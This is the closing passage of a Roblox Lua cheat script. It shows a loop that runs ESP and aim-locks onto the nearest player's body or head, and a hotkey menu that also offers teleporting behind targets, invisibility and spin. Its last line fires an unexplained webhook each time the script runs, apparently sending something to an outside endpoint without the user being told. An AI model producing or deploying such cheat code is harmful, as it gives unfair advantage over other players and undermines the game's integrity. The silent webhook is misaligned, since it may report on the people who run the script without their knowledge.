game.Players.LocalPlayer.CharacterRemoving:Connect(cleanup)

-- Main loop
game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
    if espEnabled and (tick() - lastEspUpdate) >= settings.espRefreshRate then
        updateESP()
        lastEspUpdate = tick()
    end
    
    if bodyLockActive or headLockActive then
        if not currentTarget or not currentTarget.Character or hasLowHealth(currentTarget) then
            currentTarget = findClosestPlayer(headLockActive)
            if not currentTarget then
                bodyLockActive = false
                headLockActive = false
            end
        else
            aimAtTarget()
        end
    end
end)

-- Initial message
game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "Script Activated\n"..
           "J = ESP\n"..
           "E = Body Lock (HumanoidRootPart)\n"..
           "F = Head Lock (Head)\n"..
           "P = Teleport to Location\n"..
           "Q = Toggle Spin\n"..
           "G = Teleport Behind Target\n"..
           "` (Backquote) = Toggle Invisibility\n"..
           "[ = Toggle FPS Boost",
    Color = Color3.new(0, 1, 1),
    FontSize = Enum.FontSize.Size24
})  

-- Kirim webhook saat script dijalankan
sendWebhook()
